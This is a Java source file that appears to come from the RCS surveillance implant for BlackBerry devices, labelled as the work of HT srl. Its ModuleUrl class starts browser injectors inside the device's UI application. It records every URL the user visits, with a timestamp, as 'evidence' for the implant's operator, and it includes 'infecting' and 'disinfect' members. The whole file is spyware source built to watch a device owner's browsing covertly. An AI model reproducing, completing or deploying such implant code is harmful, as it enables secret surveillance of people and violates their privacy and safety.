//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : UrlAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.module;

import java.util.Date;
import java.util.Vector;

import net.rim.device.api.ui.UiApplication;
import blackberry.Messages;
import blackberry.Status;
import blackberry.config.ConfModule;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.injection.InjectorManager;
import blackberry.injection.injectors.group.UrlGroupInjector;
import blackberry.manager.ModuleManager;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * The Class UrlAgent.
 */
public final class ModuleUrl extends BaseModule {
    //#ifdef DEBUG
    static Debug debug = new Debug("ModUrl", DebugLevel.VERBOSE);
    //#endif

    //private boolean seen = true;
    private boolean unsupported = false;
    //Timer applicationTimer;
    private static final long APP_TIMER_PERIOD = 5000;

    private static final int BROWSER_TYPE = 7;

    public static String getStaticType() {
        return Messages.getString("1f.0");//"url";
    }

    public static ModuleUrl getInstance() {
        return (ModuleUrl) ModuleManager.getInstance().get(getStaticType());
    }

    protected boolean parse(ConfModule conf) {

        setPeriod(NEVER);
        setDelay(SOON);
        return true;
    }

    public synchronized void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart");
        //#endif

        if (unsupported) {
            return;
        }

        UrlGroupInjector.enableGroup(true);
        UiApplication.getUiApplication().invokeAndWait(new Runnable() {

            public void run() {
                InjectorManager.getInstance().start();
            }
        });

    }

    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop");
        //#endif

        UrlGroupInjector.enableGroup(false);
        InjectorManager.getInstance().stop();
    }

    boolean infecting = false;

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualLoop() {
        if (unsupported) {
            return;
        }

    }

    public void saveUrl(String url) {
        //#ifdef DEBUG
        debug.trace("saveUrl: " + url);
        //#endif

        final Date date = new Date();
        DateTime datetime = new DateTime(date);

        int version = 0x20100713;
        String title = "";
        final Vector items = new Vector();

        items.addElement(datetime.getStructTm());
        items.addElement(Utils.intToByteArray(version));
        items.addElement(WChar.getBytes(url, true));
        items.addElement(Utils.intToByteArray(BROWSER_TYPE));
        items.addElement(WChar.getBytes(title, true));
        items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));

        Evidence evidence = new Evidence(EvidenceType.URL);
        evidence.createEvidence(null);
        evidence.writeEvidences(items);
        evidence.close();
        
        if(Status.self().wantLight()){
            Debug.ledFlash(Debug.COLOR_WHITE);
            Debug.playSoundOk(1);
        }

    }

    //#ifdef DEBUG
    public void disinfect() {

    }
    //#endif
}
